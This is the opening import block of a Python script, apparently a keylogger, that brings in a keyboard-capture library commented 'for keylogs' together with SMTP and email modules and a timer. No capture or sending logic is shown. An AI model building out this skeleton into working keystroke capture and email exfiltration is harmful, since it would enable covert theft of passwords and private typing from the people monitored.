import keyboard # for keylogs
import smtplib # sending email via SMTP protocol

from threading import Timer
from datetime import datetime
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText